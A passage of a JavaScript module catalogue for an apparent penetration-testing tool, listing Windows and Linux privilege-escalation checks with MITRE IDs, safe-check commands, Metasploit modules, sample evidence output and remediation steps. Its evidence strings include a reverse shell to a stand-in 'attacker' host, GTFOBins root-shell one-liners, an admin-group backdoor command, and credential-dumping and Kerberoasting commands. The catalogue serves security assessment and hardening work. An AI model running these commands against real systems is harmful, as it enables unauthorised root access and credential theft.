/**
 * AXIOM Module Inventory
 * Complete catalog: Windows PE + Linux PE + Lateral Movement
 * Each module: id, name, platform, category, mitre, checkType, severity, cvss,
 *              description, safeCheck, msfModule, evidence, remediation, tags
 */

// ─── Windows Privilege Escalation ────────────────────────────────────────────
const WINDOWS_PE = [

  // ── 1. UAC & Elevation Control ──────────────────────────────────────────────
  { id:"WIN-UAC-001", cat:"UAC & Elevation", mitre:"T1548.002", platform:"Windows",
    name:"AlwaysInstallElevated Check", type:"Safe Check", sev:"Critical", cvss:9.8,
    description:"Registry policy AlwaysInstallElevated allows any user to install MSI packages with SYSTEM privileges.",
    safeCheck:`reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`,
    evidence:"[CHECK] Querying AlwaysInstallElevated registry keys...\n[FOUND] HKLM: AlwaysInstallElevated = 0x1\n[FOUND] HKCU: AlwaysInstallElevated = 0x1\n[RISK]  Any user can install malicious MSI as SYSTEM\n[CVSS]  9.8 CRITICAL",
    remediation:"Set AlwaysInstallElevated to 0 in both HKLM and HKCU. Configure via GPO: Computer/User Configuration → Administrative Templates → Windows Components → Windows Installer.",
    msf:"exploit/windows/local/always_install_elevated" },

  { id:"WIN-UAC-002", cat:"UAC & Elevation", mitre:"T1548.002", platform:"Windows",
    name:"UAC Bypass via eventvwr.exe", type:"Metasploit", sev:"Critical", cvss:9.0,
    description:"The eventvwr.exe binary auto-elevates and reads a registry key for the MSC file to load, allowing UAC bypass via registry hijack.",
    safeCheck:`reg query HKCU\\Software\\Classes\\mscfile\\shell\\open\\command`,
    msfModule:"exploit/windows/local/bypassuac_eventvwr",
    evidence:"[MSF] use exploit/windows/local/bypassuac_eventvwr\n[MSF] set SESSION 1\n[MSF] exploit\n[*]  Targeting eventvwr.exe registry key...\n[+]  UAC bypassed — elevated shell obtained\n[+]  Meterpreter session 2 opened (SYSTEM)",
    remediation:"Enable UAC to 'Always Notify'. Restrict eventvwr.exe via AppLocker. Apply Windows security patches.",
    msf:"exploit/windows/local/bypassuac_eventvwr" },

  { id:"WIN-UAC-003", cat:"UAC & Elevation", mitre:"T1548.002", platform:"Windows",
    name:"Fodhelper UAC Bypass", type:"Metasploit", sev:"Critical", cvss:9.0,
    description:"fodhelper.exe (Features On Demand Helper) auto-elevates and loads registry keys controllable by users.",
    safeCheck:`reg query HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command`,
    msfModule:"exploit/windows/local/bypassuac_fodhelper",
    evidence:"[MSF] use exploit/windows/local/bypassuac_fodhelper\n[*]  Creating registry key hijack...\n[+]  High integrity process spawned\n[+]  NT AUTHORITY\\SYSTEM shell obtained",
    remediation:"Patch Windows. Set UAC level to Always Notify. Monitor HKCU\\Software\\Classes registry writes.",
    msf:"exploit/windows/local/bypassuac_fodhelper" },

  { id:"WIN-UAC-004", cat:"UAC & Elevation", mitre:"T1134.001", platform:"Windows",
    name:"Token Impersonation (Incognito)", type:"Metasploit", sev:"Critical", cvss:8.8,
    description:"SeImpersonatePrivilege allows a process to impersonate delegation tokens of other users including SYSTEM.",
    safeCheck:`whoami /priv | findstr SeImpersonatePrivilege\nwhoami /priv | findstr SeAssignPrimaryTokenPrivilege`,
    msfModule:"post/multi/recon/local_exploit_suggester",
    evidence:"[MSF] load incognito\n[MSF] list_tokens -u\n[FOUND] Delegation Token: NT AUTHORITY\\SYSTEM\n[FOUND] Delegation Token: DOMAIN\\Administrator\n[MSF] impersonate_token \"NT AUTHORITY\\SYSTEM\"\n[+]  SYSTEM token impersonated",
    remediation:"Remove SeImpersonatePrivilege from non-service accounts. Use Privileged Access Workstations. Enable Credential Guard.",
    msf:"post/windows/escalate/getsystem" },

  { id:"WIN-UAC-005", cat:"UAC & Elevation", mitre:"T1548.002", platform:"Windows",
    name:"Auto-Elevated COM Object Abuse", type:"Safe Check", sev:"High", cvss:8.1,
    description:"Several COM objects are auto-elevated without UAC prompts and can be abused for privilege escalation.",
    safeCheck:`Get-ItemProperty HKLM:\\Software\\Classes\\CLSID\\* | Where-Object {$_.AutoElevate -eq 1}`,
    evidence:"[CHECK] Enumerating auto-elevated COM objects...\n[FOUND] CMSTPLUA {3E5FC7F9-...} AutoElevate=1\n[FOUND] FODHELPER {4590F811-...} AutoElevate=1\n[FOUND] SDCLT {F0781F96-...} AutoElevate=1\n[RISK]  COM hijacking vectors available",
    remediation:"Apply cumulative Windows updates. Use WDAC/AppLocker to restrict COM instantiation. Monitor COM object registry paths." },

  // ── 2. Service Misconfigurations ─────────────────────────────────────────────
  { id:"WIN-SVC-001", cat:"Service Misconfigs", mitre:"T1574.009", platform:"Windows",
    name:"Unquoted Service Path", type:"Safe Check", sev:"High", cvss:7.8,
    description:"When a service executable path contains spaces and is not quoted, Windows may execute an attacker-controlled binary.",
    safeCheck:`wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\"`,
    evidence:`[CHECK] Scanning all services for unquoted paths...\n[FOUND] Service: VulnService\n[PATH]  C:\\Program Files\\Vuln App\\service.exe (UNQUOTED)\n[RISK]  Drop 'C:\\Program.exe' to escalate to LocalSystem\n[CVSS]  7.8 HIGH`,
    remediation:`Quote all service paths in registry: HKLM\\SYSTEM\\CurrentControlSet\\Services\\<service>\\ImagePath. Use sc config <service> binpath= "\"C:\\path with spaces\\service.exe\""` },

  { id:"WIN-SVC-002", cat:"Service Misconfigs", mitre:"T1574.009", platform:"Windows",
    name:"Weak Service Binary Permissions", type:"Safe Check", sev:"Critical", cvss:9.0,
    description:"Service binaries writable by unprivileged users allow replacement with malicious executables.",
    safeCheck:`icacls "C:\\path\\to\\service.exe"\naccesschk.exe -wuvc "Everyone" *`,
    msfModule:"post/windows/escalate/service_permissions",
    evidence:`[CHECK] Checking service binary ACLs...\n[FOUND] C:\\Program Files\\Vuln\\service.exe\n[ACL]   Everyone:(F) — Full control!\n[RISK]  Replace binary → LocalSystem on next restart\n[CVSS]  9.0 CRITICAL`,
    remediation:"Set correct ACLs: icacls \"path\" /inheritance:d /grant:r \"NT SERVICE\\TrustedInstaller:F\" /remove \"Everyone\"" },

  { id:"WIN-SVC-003", cat:"Service Misconfigs", mitre:"T1574.009", platform:"Windows",
    name:"Writable Service Registry Key", type:"Safe Check", sev:"High", cvss:7.8,
    description:"Writable service registry keys allow modification of the executable path or parameters.",
    safeCheck:`accesschk.exe -kvuqsw hklm\\System\\CurrentControlSet\\services`,
    evidence:`[CHECK] Scanning service registry permissions...\n[FOUND] HKLM\\SYSTEM\\CCS\\Services\\VulnSvc\n[ACL]   BUILTIN\\Users:(RW) on ImagePath\n[RISK]  Modify ImagePath to execute malicious binary`,
    remediation:"Restrict service registry key permissions. Only SYSTEM and Administrators should have write access." },

  { id:"WIN-SVC-004", cat:"Service Misconfigs", mitre:"T1574.009", platform:"Windows",
    name:"Weak Service Permissions (sc.exe)", type:"Safe Check", sev:"Critical", cvss:9.0,
    description:"SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG granted to low-privileged users allows service reconfiguration.",
    safeCheck:`accesschk.exe -uwcv "Authenticated Users" *`,
    msfModule:"post/windows/escalate/service_permissions",
    evidence:`[CHECK] accesschk.exe -uwcv Everyone *\n[FOUND] VulnService\n  RW Everyone\n    SERVICE_ALL_ACCESS\n[EXPLOIT] sc config VulnService binpath= "net localgroup administrators attacker /add"\n[EXPLOIT] sc start VulnService`,
    remediation:"Remove SERVICE_CHANGE_CONFIG from unprivileged groups. Audit service DACLs with accesschk.exe." },

  { id:"WIN-SVC-005", cat:"Service Misconfigs", mitre:"T1574.009", platform:"Windows",
    name:"DLL Search Order Hijacking", type:"Safe Check", sev:"High", cvss:7.8,
    description:"Services loading DLLs from user-writable directories allow privilege escalation via DLL substitution.",
    safeCheck:`Procmon filter: Operation=LoadImage, Result=NAME NOT FOUND`,
    evidence:`[CHECK] Monitoring DLL load failures...\n[FOUND] Service: PrintSpooler loading winspool.drv\n[FOUND] Search path includes C:\\Users\\Public\\ (writable!)\n[RISK]  Drop malicious winspool.drv → code runs as SYSTEM`,
    remediation:"Use absolute DLL paths. Enable DLL Safe Search Order. Set CWD to system directory for privileged services." },

  // ── 3. Scheduled Tasks ───────────────────────────────────────────────────────
  { id:"WIN-TASK-001", cat:"Scheduled Tasks", mitre:"T1053.005", platform:"Windows",
    name:"Writable Scheduled Task Executable", type:"Safe Check", sev:"Critical", cvss:9.0,
    description:"Scheduled tasks running as SYSTEM with world-writable executables allow escalation.",
    safeCheck:`schtasks /query /fo LIST /v | findstr /B /C:"Task To Run" /C:"Run As User"\naccesschk.exe -wuvc "Users" <task_binary>`,
    evidence:`[CHECK] Querying scheduled tasks...\n[FOUND] Task: BackupDaily\n[RUN AS] SYSTEM\n[BINARY] C:\\backup\\backup.bat\n[ACL]   Everyone:(F) FULL CONTROL\n[RISK]  Replace backup.bat → SYSTEM code execution`,
    remediation:"Fix ACLs on task executables. Review all SYSTEM-level tasks: schtasks /query /fo CSV." },

  { id:"WIN-TASK-002", cat:"Scheduled Tasks", mitre:"T1053.005", platform:"Windows",
    name:"Task Scheduler XML Configuration", type:"Safe Check", sev:"High", cvss:7.5,
    description:"Task XML files in C:\\Windows\\System32\\Tasks writable by users allow task tampering.",
    safeCheck:`icacls C:\\Windows\\System32\\Tasks\\*`,
    evidence:`[CHECK] Checking task XML permissions...\n[FOUND] C:\\Windows\\System32\\Tasks\\Microsoft\\Windows\\BackupTask\n[ACL]   BUILTIN\\Users:(W)\n[RISK]  Modify task Action to run attacker binary as SYSTEM`,
    remediation:"Restrict write access to task XML files. Only TrustedInstaller should have modify rights." },

  // ── 4. DLL & Execution Hijacking ─────────────────────────────────────────────
  { id:"WIN-DLL-001", cat:"DLL Hijacking", mitre:"T1574.001", platform:"Windows",
    name:"DLL Search Order Hijack in PATH", type:"Safe Check", sev:"High", cvss:7.8,
    description:"Writable directories early in the PATH environment variable allow DLL placement for hijacking.",
    safeCheck:`$env:PATH -split ';' | ForEach-Object { icacls $_ }`,
    evidence:`[CHECK] Checking PATH directories for write access...\n[FOUND] C:\\Python38\\ — BUILTIN\\Users:(W)\n[FOUND] C:\\ProgramData\\App\\ — BUILTIN\\Users:(W)\n[RISK]  Drop malicious DLL in writable PATH dir`,
    remediation:"Remove user-writable directories from system PATH. Enable Windows Defender Application Control." },

  { id:"WIN-DLL-002", cat:"DLL Hijacking", mitre:"T1574.002", platform:"Windows",
    name:"DLL Side-Loading Detection", type:"Safe Check", sev:"High", cvss:8.0,
    description:"Applications loading DLLs from their own directory first can be abused if the directory is writable.",
    safeCheck:`SigCheck.exe -nobanner -u -e C:\\Program Files\\`,
    evidence:`[CHECK] Scanning application DLL loads...\n[FOUND] App.exe loading version.dll from application directory\n[FOUND] Application directory BUILTIN\\Users:(W)\n[RISK]  Plant malicious version.dll → code runs as app`,
    remediation:"Use absolute paths for DLL imports. Sign all DLLs. Restrict application directory write permissions." },

  { id:"WIN-DLL-003", cat:"DLL Hijacking", mitre:"T1546.011", platform:"Windows",
    name:"Application Shimming (AppCompat)", type:"Safe Check", sev:"High", cvss:7.5,
    description:"Application Compatibility shims can redirect API calls, enabling privilege escalation or persistence.",
    safeCheck:`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB"`,
    evidence:`[CHECK] Enumerating application shims...\n[FOUND] Custom SDB file: C:\\ProgramData\\shim.sdb\n[FOUND] Shim targets: cmd.exe, powershell.exe\n[RISK]  InjectDll shim can load arbitrary DLL`,
    remediation:"Audit Application Compatibility Database. Remove unauthorized shims. Monitor sdbinst.exe execution." },

  // ── 5. Credential & Token Escalation ─────────────────────────────────────────
  { id:"WIN-CRED-001", cat:"Credential & Token", mitre:"T1003.001", platform:"Windows",
    name:"SAM Database Credential Extraction", type:"Metasploit", sev:"Critical", cvss:9.8,
    description:"The SAM database stores local account NTLM hashes. VSS or registry access enables extraction.",
    safeCheck:`reg query HKLM\\SAM (requires SYSTEM)`,
    msfModule:"post/windows/gather/hashdump",
    evidence:`[MSF] run post/windows/gather/hashdump\n[+]  Obtaining the boot key...\n[+]  Calculating the hboot key using SYSKEY...\n[HASH] Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n[HASH] Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[HASH] User1:1001:aad3b435::8846f7eaee8fb117...`,
    remediation:"Enable Windows Credential Guard. Use Microsoft LAPS for local admin passwords. Enable Protected Users security group." },

  { id:"WIN-CRED-002", cat:"Credential & Token", mitre:"T1003.001", platform:"Windows",
    name:"LSASS Memory Credential Dump", type:"Metasploit", sev:"Critical", cvss:9.8,
    description:"LSASS process holds plaintext credentials (WDigest) and NTLM hashes in memory.",
    safeCheck:`tasklist | findstr lsass\nGet-Process lsass`,
    msfModule:"post/windows/gather/credentials/credential_collector",
    evidence:`[MSF] sekurlsa::logonpasswords\n[FOUND] Username: Administrator\n[FOUND] Domain: CORP\n[FOUND] Password: P@ssw0rd123\n[FOUND] NTLM: aad3b435b51404ee8846f7eaee8fb117\n[FOUND] Username: svc_backup — Password: BackupPass2024`,
    remediation:"Disable WDigest: HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest → UseLogonCredential=0. Enable Credential Guard. Use Windows Hello for Business." },

  { id:"WIN-CRED-003", cat:"Credential & Token", mitre:"T1552.002", platform:"Windows",
    name:"Credentials in Registry", type:"Safe Check", sev:"High", cvss:7.5,
    description:"Applications sometimes store credentials in registry keys in plaintext.",
    safeCheck:`reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s`,
    evidence:`[CHECK] Searching registry for password strings...\n[FOUND] HKCU\\Software\\VNC\\Password = 5e0a90cd3f49cf82\n[FOUND] HKLM\\Software\\App\\DBPass = "Passw0rd!"\n[FOUND] HKLM\\Software\\OracleApp\\NTSecurity = "oracle123"\n[RISK]  Credentials recoverable without admin rights`,
    remediation:"Remove stored credentials from registry. Use Windows Credential Manager or CyberArk vault instead." },

  // ── 6. Registry Weaknesses ───────────────────────────────────────────────────
  { id:"WIN-REG-001", cat:"Registry Weaknesses", mitre:"T1547.001", platform:"Windows",
    name:"Autorun Key Write Access", type:"Safe Check", sev:"High", cvss:7.8,
    description:"Writable autorun registry keys allow persistence and potential privilege escalation at user login.",
    safeCheck:`accesschk.exe -wuks hklm\\software\\microsoft\\windows\\currentversion\\run\naccesschk.exe -wuks hkcu\\software\\microsoft\\windows\\currentversion\\run`,
    evidence:`[CHECK] Checking autorun key permissions...\n[FOUND] HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n[ACL]   Current User: Full Control (expected)\n[FOUND] HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n[ACL]   BUILTIN\\Users:(W) — UNEXPECTED\n[RISK]  Any user can add SYSTEM-level autorun entries`,
    remediation:"Restrict HKLM Run key to Administrators only. Monitor autorun key changes with Sysmon EventID 13." },

  { id:"WIN-REG-002", cat:"Registry Weaknesses", mitre:"T1546.010", platform:"Windows",
    name:"AppInit DLL Registry Abuse", type:"Safe Check", sev:"High", cvss:8.0,
    description:"AppInit_DLLs registry key causes listed DLLs to be loaded in every user-mode process, including SYSTEM processes.",
    safeCheck:`reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows" /v AppInit_DLLs`,
    evidence:`[CHECK] HKLM\\...\\Windows\\AppInit_DLLs\n[FOUND] AppInit_DLLs = "C:\\ProgramData\\loader.dll"\n[FOUND] LoadAppInit_DLLs = 0x1\n[RISK]  loader.dll injected into all GUI processes\n[NOTE]  Disabled by Secure Boot — check if SecureBoot enabled`,
    remediation:"Clear AppInit_DLLs. Enable Secure Boot (disables AppInit loading). Monitor this registry value." },

  // ── 7. Kernel CVEs ───────────────────────────────────────────────────────────
  { id:"WIN-KERN-001", cat:"Kernel CVEs", mitre:"T1068", platform:"Windows",
    name:"PrintNightmare (CVE-2021-34527)", type:"Metasploit", sev:"Critical", cvss:8.8,
    description:"Windows Print Spooler remote code execution vulnerability allows SYSTEM privileges.",
    safeCheck:`Get-Service Spooler | Select Status\nGet-HotFix -Id KB5004945,KB5004946,KB5004947`,
    msfModule:"exploit/windows/dcerpc/cve_2021_1675_printspooler",
    evidence:`[CHECK] Print Spooler service: RUNNING\n[CHECK] Missing patches: KB5004945 NOT INSTALLED\n[MSF]   use exploit/windows/dcerpc/cve_2021_1675_printspooler\n[+]    NT AUTHORITY\\SYSTEM Meterpreter session opened\n[CVE]  CVE-2021-34527 CRITICAL`,
    remediation:"Apply KB5004945+. Disable Print Spooler on DCs: Stop-Service Spooler -Force. Disable via GPO if not needed." },

  { id:"WIN-KERN-002", cat:"Kernel CVEs", mitre:"T1068", platform:"Windows",
    name:"HiveNightmare (CVE-2021-36934)", type:"Safe Check", sev:"High", cvss:7.8,
    description:"Windows SAM, SYSTEM, SECURITY registry files readable by all users in certain Windows 10/11 builds.",
    safeCheck:`icacls C:\\Windows\\System32\\config\\SAM`,
    evidence:`[CHECK] icacls C:\\Windows\\System32\\config\\SAM\n[FOUND] BUILTIN\\Users:(RX) — Users can read SAM!\n[CVE]   CVE-2021-36934 (HiveNightmare / SeriousSAM)\n[RISK]  Copy SAM + SYSTEM hives, extract hashes offline`,
    remediation:"Apply KB5003173+. Delete shadow copies. Restrict SAM permissions: icacls C:\\Windows\\System32\\config\\SAM /inheritance:d" },

  { id:"WIN-KERN-003", cat:"Kernel CVEs", mitre:"T1068", platform:"Windows",
    name:"Local Privilege Escalation CVE Scanner", type:"Safe Check", sev:"High", cvss:8.0,
    description:"Checks for missing patches related to known local privilege escalation CVEs.",
    safeCheck:`systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"\nwmic qfe get Caption,Description,HotFixID,InstalledOn`,
    msfModule:"post/multi/recon/local_exploit_suggester",
    evidence:`[MSF] run post/multi/recon/local_exploit_suggester\n[*]  192.168.195.139 - Collecting local exploits for x64/windows...\n[+]  exploit/windows/local/bypassuac_fodhelper — Appears vulnerable\n[+]  exploit/windows/local/ms16_032_secondary_logon_handle_privesc — Appears vulnerable\n[+]  exploit/windows/local/ms14_058_track_popup_menu — Appears vulnerable\n[*]  4 exploit checks are less than reliable`,
    remediation:"Apply all Windows security updates via Windows Update. Enable automatic updates. Use WSUS for enterprise patch management." },

  // ── 8. Process Injection ─────────────────────────────────────────────────────
  { id:"WIN-PROC-001", cat:"Process Injection", mitre:"T1055", platform:"Windows",
    name:"Process Injection via Migrate", type:"Metasploit", sev:"Critical", cvss:9.0,
    description:"Migrating Meterpreter to a SYSTEM process inherits its privileges.",
    safeCheck:`tasklist /FI "STATUS eq RUNNING" /FO CSV`,
    msfModule:"post/windows/manage/migrate",
    evidence:`[MSF] ps | grep SYSTEM\n[FOUND] PID 680 — winlogon.exe — NT AUTHORITY\\SYSTEM\n[FOUND] PID 1234 — svchost.exe — NT AUTHORITY\\SYSTEM\n[MSF] migrate 680\n[+]  Successfully migrated to winlogon.exe (SYSTEM)\n[+]  Current UID: NT AUTHORITY\\SYSTEM`,
    remediation:"Use Windows Defender Credential Guard. Enable Kernel Protection (HVCI). Deploy Endpoint Detection & Response (EDR)." },

  // ── 9. Service Account Abuse ──────────────────────────────────────────────────
  { id:"WIN-SA-001", cat:"Service Account Abuse", mitre:"T1078.003", platform:"Windows",
    name:"Kerberoasting Service Account Tickets", type:"Metasploit", sev:"Critical", cvss:8.8,
    description:"Service accounts with SPNs are vulnerable to Kerberoasting — offline password cracking of Kerberos tickets.",
    safeCheck:`setspn -T domain.local -Q */*\nGet-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`,
    msfModule:"auxiliary/gather/get_user_spns",
    evidence:`[MSF] GetUserSPNs.py domain.local/user:pass -outputfile hashes.txt\n[FOUND] MSSQLSvc/db01.domain.local:1433 — svc_sql\n[FOUND] HTTP/web01.domain.local — svc_web\n[HASH]  $krb5tgs$23$*svc_sql*...<ticket>...\n[CRACK] hashcat -a 0 -m 13100 hashes.txt rockyou.txt\n[FOUND] Password: Service@2024!`,
    remediation:"Use Managed Service Accounts (MSA/gMSA). Set 25+ character complex passwords for service accounts. Enable AES256 for service tickets (eliminates RC4)." },

  // ── 10. Print/Spooler Abuse ───────────────────────────────────────────────────
  { id:"WIN-SPOOL-001", cat:"Print/Spooler Abuse", mitre:"T1547.012", platform:"Windows",
    name:"Print Processor DLL Hijack", type:"Metasploit", sev:"Critical", cvss:9.8,
    description:"Custom print processors load as SYSTEM and can be used to execute arbitrary DLLs.",
    safeCheck:`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors"`,
    msfModule:"exploit/windows/local/print_spooler_load_dll",
    evidence:`[CHECK] Enumerating print processors...\n[FOUND] Custom processor: C:\\Windows\\System32\\spool\\prtprocs\\x64\\custom.dll\n[ACL]   Directory writable by Users\n[MSF]   DLL planted, spooler restarted\n[+]    SYSTEM shell via print processor`,
    remediation:"Restrict print processor directory permissions. Disable Print Spooler where not needed. Monitor registry changes to print processor keys." },
];

// ─── Linux Privilege Escalation ──────────────────────────────────────────────
const LINUX_PE = [

  // ── 1. Sudo & Sudoers ────────────────────────────────────────────────────────
  { id:"LNX-SUDO-001", cat:"Sudo & Sudoers", mitre:"T1548.003", platform:"Linux",
    name:"Sudo -l Enumeration", type:"Safe Check", sev:"High", cvss:7.8,
    description:"Lists all sudo permissions for the current user. Misconfigured entries allow root escalation.",
    safeCheck:`sudo -l 2>/dev/null`,
    evidence:`[CMD] sudo -l\n[FOUND] User www-data may run the following on server:\n[FOUND]   (ALL : ALL) NOPASSWD: /bin/bash\n[RISK]  Direct root: sudo bash -p → root shell\n[CVSS]  7.8 HIGH`,
    remediation:"Remove NOPASSWD entries. Use specific command paths. Audit /etc/sudoers and /etc/sudoers.d/* regularly." },

  { id:"LNX-SUDO-002", cat:"Sudo & Sudoers", mitre:"T1548.003", platform:"Linux",
    name:"Sudo Wildcard Injection", type:"Safe Check", sev:"Critical", cvss:9.0,
    description:"Wildcards in sudoers rules allow injection of arbitrary arguments including shell escapes.",
    safeCheck:`sudo -l | grep '\\*'`,
    evidence:`[FOUND] (root) NOPASSWD: /usr/bin/rsync *\n[FOUND] (root) NOPASSWD: /usr/bin/find * -exec\n[EXPLOIT] sudo rsync -e "sh -p" . /dev/null\n[+]     Root shell obtained via wildcard injection\n[GTFO]  GTFOBins rsync escalation path confirmed`,
    remediation:"Remove wildcards from sudoers. Specify exact paths and arguments. Use sudoedit for file editing." },

  { id:"LNX-SUDO-003", cat:"Sudo & Sudoers", mitre:"T1548.003", platform:"Linux",
    name:"Baron Samedit CVE-2021-3156", type:"Metasploit", sev:"Critical", cvss:7.8,
    description:"Heap-based buffer overflow in sudo (versions <1.9.5p2) allows root without password.",
    safeCheck:`sudo --version | head -1`,
    msfModule:"exploit/linux/local/sudo_baron_samedit",
    evidence:`[CHECK] sudo --version\n[FOUND] Sudo version 1.8.27\n[CVE]   CVE-2021-3156 (Baron Samedit)\n[MSF]   use exploit/linux/local/sudo_baron_samedit\n[+]    Root shell obtained (heap overflow)\n[NOTE]  Affected: 1.8.2-1.8.31p2, 1.9.0-1.9.5p1`,
    remediation:"Upgrade sudo: apt-get upgrade sudo. Versions 1.9.5p2+ are patched." },

  { id:"LNX-SUDO-004", cat:"Sudo & Sudoers", mitre:"T1548.003", platform:"Linux",
    name:"Editable Script via Sudo", type:"Safe Check", sev:"Critical", cvss:9.0,
    description:"If a script run via sudo is world-writable, an attacker can inject commands.",
    safeCheck:`sudo -l | grep -v '^[#[]' | awk '{print $NF}' | xargs -I{} ls -la {} 2>/dev/null`,
    evidence:`[FOUND] (root) NOPASSWD: /opt/scripts/backup.sh\n[CHECK] ls -la /opt/scripts/backup.sh\n[-rw-rw-rw-] 777 root root backup.sh\n[INJECT] echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' >> backup.sh\n[EXEC]  sudo /opt/scripts/backup.sh\n[+]    Root shell via injected command`,
    remediation:"Fix permissions: chmod 750 /opt/scripts/backup.sh && chown root:root backup.sh. Audit all sudo-accessible scripts." },

  { id:"LNX-SUDO-005", cat:"Sudo & Sudoers", mitre:"T1548.003", platform:"Linux",
    name:"Sudo Environment Variable Abuse (LD_PRELOAD)", type:"Safe Check", sev:"Critical", cvss:9.0,
    description:"If env_keep includes LD_PRELOAD, a malicious shared library can be loaded by sudo commands.",
    safeCheck:`sudo -l | grep LD_PRELOAD`,
    evidence:`[FOUND] env_keep += LD_PRELOAD\n[EXPLOIT] create shell.c → preload library\n[CMD]   sudo LD_PRELOAD=/tmp/shell.so find\n[+]    setuid(0) executed → root shell\n[CVSS]  9.0 CRITICAL`,
    remediation:"Remove env_keep entries from sudoers. Never allow LD_PRELOAD, LD_LIBRARY_PATH in sudo environments." },

  // ── 2. SUID/SGID ─────────────────────────────────────────────────────────────
  { id:"LNX-SUID-001", cat:"SUID/SGID", mitre:"T1548.001", platform:"Linux",
    name:"Find All SUID Binaries", type:"Safe Check", sev:"Medium", cvss:5.5,
    description:"SUID binaries execute as their owner (usually root). Unexpected SUID binaries indicate risk.",
    safeCheck:`find / -perm -4000 -type f 2>/dev/null\nfind / -perm -2000 -type f 2>/dev/null`,
    evidence:`[CMD] find / -perm -4000 -type f 2>/dev/null\n[FOUND] /usr/bin/find\n[FOUND] /usr/bin/vim.basic\n[FOUND] /usr/bin/python3.8\n[FOUND] /usr/bin/nmap (old ver)\n[FOUND] /usr/local/bin/custom-app\n[RISK]  GTFOBins exploitation vectors exist for: find, vim, python`,
    remediation:"Remove unnecessary SUID bits: chmod u-s /usr/bin/find. Audit quarterly: find / -perm -4000 -type f" },

  { id:"LNX-SUID-002", cat:"SUID/SGID", mitre:"T1548.001", platform:"Linux",
    name:"GTFOBins SUID Exploitation", type:"Safe Check", sev:"Critical", cvss:9.8,
    description:"Certain SUID binaries have known GTFOBins escalation paths that grant root shell.",
    safeCheck:`which find vim python python3 perl ruby node php nmap awk sed more less man 2>/dev/null | xargs -I{} find {} -perm -4000 2>/dev/null`,
    evidence:`[FOUND] /usr/bin/find has SUID bit\n[EXPLOIT] find . -exec /bin/sh -p \\; -quit\n# sh-5.1# id\n[+]    uid=0(root) gid=0(root) groups=0(root)\n\n[FOUND] /usr/bin/python3 has SUID bit\n[EXPLOIT] python3 -c "import os; os.setuid(0); os.system('/bin/sh')"\n[+]    Root shell via Python SUID`,
    remediation:"Remove SUID from non-essential binaries. Create whitelist of approved SUID binaries. Monitor with auditd." },

  { id:"LNX-SUID-003", cat:"SUID/SGID", mitre:"T1548.001", platform:"Linux",
    name:"Writable SUID Binary", type:"Safe Check", sev:"Critical", cvss:9.8,
    description:"SUID binaries writable by non-root users can be replaced with a malicious binary.",
    safeCheck:`find / -perm -4000 -type f 2>/dev/null | xargs ls -la | awk '$1 ~ /w/' `,
    evidence:`[CHECK] Checking SUID binary permissions...\n[FOUND] -rwsrwxrwx root root /opt/app/setuid-wrapper\n[RISK]  World-writable SUID binary!\n[EXPLOIT] cp /bin/bash /opt/app/setuid-wrapper; /opt/app/setuid-wrapper -p\n[+]    bash-5.1# id → uid=0(root)`,
    remediation:"Immediately fix: chmod 4755 /opt/app/setuid-wrapper. Audit all SUID binaries for group/world write permissions." },

  { id:"LNX-SUID-004", cat:"SUID/SGID", mitre:"T1548.001", platform:"Linux",
    name:"Nmap SUID (Legacy Versions)", type:"Safe Check", sev:"Critical", cvss:9.0,
    description:"Nmap versions <5.21 with SUID allow interactive mode shell escape to root.",
    safeCheck:`nmap --version 2>/dev/null | head -1; find / -name nmap -perm -4000 2>/dev/null`,
    evidence:`[FOUND] /usr/local/bin/nmap version 4.53 (SUID set!)\n[EXPLOIT] nmap --interactive\nStarting Nmap V. 4.53\nnmap> !sh\n# id\nuid=0(root) gid=0(root)\n[+]    Root shell via nmap interactive mode`,
    remediation:"Upgrade Nmap to 5.21+. Remove SUID from Nmap entirely — it does not require SUID to function." },

  // ── 3. Linux Capabilities ─────────────────────────────────────────────────────
  { id:"LNX-CAP-001", cat:"Linux Capabilities", mitre:"T1548", platform:"Linux",
    name:"Dangerous File Capabilities", type:"Safe Check", sev:"Critical", cvss:8.8,
    description:"Linux capabilities grant specific privileges to binaries without full SUID. cap_setuid, cap_sys_admin are dangerous.",
    safeCheck:`getcap -r / 2>/dev/null\nfind / -xdev -print | xargs getcap 2>/dev/null`,
    evidence:`[CMD] getcap -r / 2>/dev/null\n[FOUND] /usr/bin/python3.8 = cap_setuid+ep\n[FOUND] /usr/bin/perl = cap_setuid+ep\n[FOUND] /usr/sbin/tcpdump = cap_net_raw+ep\n[EXPLOIT] python3 -c "import os; os.setuid(0); os.system('/bin/sh')"\n[+]    Root shell via cap_setuid capability`,
    remediation:"Remove unnecessary capabilities: setcap -r /usr/bin/python3.8. Review all capabilities: getcap -r /" },

  { id:"LNX-CAP-002", cat:"Linux Capabilities", mitre:"T1548", platform:"Linux",
    name:"CAP_SYS_ADMIN Container Exposure", type:"Safe Check", sev:"Critical", cvss:9.8,
    description:"CAP_SYS_ADMIN is nearly equivalent to root and allows mounting filesystems, device access, and kernel parameter modification.",
    safeCheck:`cat /proc/self/status | grep CapEff\ngetcap /proc/1/exe 2>/dev/null`,
